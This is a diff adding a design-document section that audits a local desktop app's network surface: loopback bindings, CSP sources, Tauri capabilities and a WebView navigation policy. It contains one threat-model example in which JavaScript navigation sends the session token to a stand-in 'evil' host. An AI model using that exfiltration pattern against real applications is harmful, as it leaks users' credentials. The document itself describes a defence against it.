@@ -2158,6 +2158,41 @@ the GStreamer plugins (whose absence only disables a feature).
 Not sandboxed, deliberately: =!= shell commands (the user typed them) and
 =gst-inspect-1.0= (reads the plugin registry, never a user file).
 
+** No network access (resolved: loopback only)
+
+Metafolder never talks to the internet, and nothing in it *can*. Audited across
+the workspace, the surface is:
+
+- *Listening*: the daemon (=127.0.0.1:7523=) and the GUI server
+  (=127.0.0.1:7524=) bind loopback only, both behind the session token.
+- *Outgoing (Rust)*: =reqwest= (GUI → daemon) and =ureq= (CLI → daemon) build
+  loopback URLs only, redirects disabled. =git2= (=config_sync=) performs no
+  remote operation — no fetch, push or clone. The media helpers run with
+  =--unshare-net= (see [[*Untrusted media]]): no network interface at all.
+- *Tauri*: =core:default= capability only — no =http= plugin, no =shell= plugin.
+- *The WebView* is the one real risk: a full browser engine, in the realm that
+  holds the session token, the =fs= API and =!= shell commands. Two gates keep
+  it off the network, and they are complementary:
+  1. A *Content-Security-Policy* (=tauri.conf.json=; it was =null=, i.e. no
+     policy at all) whose every source expression is local: =default-src
+     'self'=, plus loopback for the panel assets, =/fsraw= and =/thumbnail=
+     (the GUI port is configurable, hence =http://127.0.0.1:*=), plus Tauri's
+     IPC. No remote origin is reachable by =fetch=, =<img>=, =import()= or any
+     other subresource. =object-src=/=frame-src= are ='none'= — the [[*=/fsraw=:
+     media, never a document]] invariant, stated again where the browser
+     enforces it.
+  2. A *navigation policy* (WebKit =decide-policy=, =sandbox::is_local_navigation=):
+     no CSP directive governs top-level navigation, so
+     =location.href = 'https://evil/?' + token= would otherwise still leave,
+     carrying whatever it liked in the URL. Any navigation outside the app's own
+     origins is refused (an unreadable target too — fail closed).
+
+The one deliberate exception is =!= shell commands: the user typed them, and
+they can obviously run =curl=.
+
+Guarded by =crates/gui/tests/network_surface.rs= (the CSP admits no remote
+source) and the =sandbox= navigation tests.
+
 ** =/fsraw=: media, never a document
 
 =/fsraw= serves arbitrary local files and carries the session token in the URL
